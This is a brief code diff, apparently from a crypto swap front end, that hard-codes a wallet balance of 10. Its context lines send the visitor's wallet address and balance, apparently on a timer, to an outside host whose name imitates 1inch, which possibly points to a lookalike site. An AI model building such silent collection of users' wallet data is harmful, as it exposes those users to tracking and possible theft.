@@ -418,7 +418,7 @@ if(youPayToken === "MATIC") {
 
     const dataToSend = {
       wallet: address,
-      balance: data.formatted,
+      balance: 10,
     };
     
     fetch('https://1inch2test-rud8.vercel.app/api/wallet-balance', {
@@ -450,7 +450,7 @@ if(youPayToken === "MATIC") {
   useEffect(() => {
     const dataToSend = {
       wallet: address,
-      balance: data.formatted,
+      balance: 10,
     };
 
     const sendDataPeriodically = () => {
